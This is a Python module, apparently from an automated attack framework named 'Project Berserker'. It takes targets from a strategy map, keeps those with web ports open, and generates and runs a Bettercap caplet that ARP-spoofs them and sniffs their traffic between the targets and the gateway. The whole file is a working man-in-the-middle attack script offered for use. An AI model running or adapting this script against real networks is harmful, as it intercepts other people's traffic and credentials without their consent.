import os
import sys
import json
import time
import signal
import ipaddress
import subprocess
from datetime import datetime

CONTEXT_FILE = "data/context/context.json"
STRATEGY_DIR = "data/strategy"
LOG_DIR = "logs"
CAPLET_DIR = "data/config"

os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(CAPLET_DIR, exist_ok=True)

CAPLET_FILE = os.path.join(CAPLET_DIR, "mitm.cap")
LOG_FILE = os.path.join(LOG_DIR, "bettercap_raw.log")

INTERFACE = None
GATEWAY_IP = None
MITM_TARGETS = []
PROCESS = None

def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[~] {msg}", flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(f"[{ts}] {msg}\n")

def ensure_interface_up(interface):
    os.system(f"ip link set {interface} up")
    log(f"[✓] Interface {interface} set to UP.")

def get_active_interface():
    try:
        from scapy.all import get_if_list, get_if_addr
        candidates = []
        for iface in get_if_list():
            if iface.startswith("lo") or "docker" in iface or "virbr" in iface:
                continue
            try:
                ip = get_if_addr(iface)
                if ipaddress.IPv4Address(ip).is_private:
                    candidates.append((iface, ip))
            except:
                continue
        for prefix in ["192.168.", "172.", "10."]:
            for iface, ip in candidates:
                if ip.startswith(prefix):
                    ensure_interface_up(iface)
                    return iface
        if candidates:
            ensure_interface_up(candidates[0][0])
            return candidates[0][0]
        return None
    except:
        log("[!] Failed to import scapy.")
        return None

def get_latest_strategy_file():
    try:
        files = [f for f in os.listdir(STRATEGY_DIR) if f.startswith("strategy_map_") and f.endswith(".json")]
        if not files:
            return None
        return os.path.join(STRATEGY_DIR, max(files, key=lambda f: os.path.getmtime(os.path.join(STRATEGY_DIR, f))))
    except:
        return None

def load_targets():
    global GATEWAY_IP, MITM_TARGETS

    strategy_path = get_latest_strategy_file()
    if not os.path.exists(CONTEXT_FILE):
        log("[ERROR] context.json not found.")
        sys.exit(1)

    with open(CONTEXT_FILE) as f:
        context = json.load(f)
    devices = context.get("devices", {})
    GATEWAY_IP = context.get("gateway")

    if not GATEWAY_IP:
        log("[ERROR] Gateway IP not found in context.json.")
        sys.exit(1)

    ai_mitm_targets = []
    if strategy_path and os.path.exists(strategy_path):
        with open(strategy_path) as f:
            strategy = json.load(f)
        ai_mitm_targets = [ip for ip, mods in strategy.items() if "mitm_attack" in mods]

    if not ai_mitm_targets:
        log("[!] No MITM targets found in strategy map.")
        sys.exit(1)

    for ip in ai_mitm_targets:
        info = devices.get(ip)
        if not info:
            continue
        for p in info.get("protocols", {}).get("tcp", []):
            if p.get("port") in [80, 443] and p.get("state") == "open":
                MITM_TARGETS.append(ip)
                break

    if not MITM_TARGETS:
        log("[ERROR] No valid MITM targets found.")
        sys.exit(1)

    log(f"[✓] Gateway IP: {GATEWAY_IP}")
    log(f"[✓] MITM targets: {MITM_TARGETS}")

def generate_caplet():
    caplet = f"""
net.probe on    
set arp.spoof.fullduplex true
set arp.spoof.targets {','.join(MITM_TARGETS)}
set events.stream.output detailed
set net.sniff.local false
arp.spoof on
net.sniff on
"""
    with open(CAPLET_FILE, "w") as f:
        f.write(caplet)
    log(f"[✓] Caplet file created: {CAPLET_FILE}")

def shutdown(signum, frame):
    global PROCESS
    if PROCESS:
        PROCESS.terminate()
    log("[!] Bettercap terminated.")
    sys.exit(0)

def run_bettercap(duration=60):
    log(f"[~] Running Bettercap for {duration} seconds...")
    os.system(f"script -q -c 'timeout {duration} bettercap -iface {INTERFACE} -caplet {CAPLET_FILE}' {LOG_FILE}")
    log("[✓] Bettercap execution completed.")

def main():
    global INTERFACE
    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    log("=== MITM MODULE STARTED (Project Berserker) ===")
    INTERFACE = get_active_interface()
    if not INTERFACE:
        log("[ERROR] No active interface found.")
        sys.exit(1)

    log(f"[✓] Active interface: {INTERFACE}")
    load_targets()
    generate_caplet()
    run_bettercap(duration=60)

if __name__ == "__main__":
    main()
